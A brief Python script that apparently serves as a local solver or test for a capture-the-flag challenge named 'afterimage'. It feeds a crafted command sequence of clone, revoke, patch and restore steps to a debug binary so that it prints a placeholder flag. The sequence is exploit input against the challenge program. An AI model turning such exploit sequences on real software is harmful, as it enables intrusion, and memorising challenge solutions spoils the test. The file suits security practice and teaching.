#!/usr/bin/env python3
import subprocess
from pathlib import Path

flag = "DNCTF{afterimage_local_test}"
sequence = b"""new base 7
clone branch base
checkout base
revoke
new filler 7
patch branch 8 2047987285
restore branch
quit
"""

result = subprocess.run(
    [str(Path(__file__).with_name("debug-binary"))],
    input=sequence,
    env={**__import__("os").environ, "AFTERIMAGE_FLAG": flag},
    stdout=subprocess.PIPE,
    check=True,
)
print(result.stdout.decode(), end="")
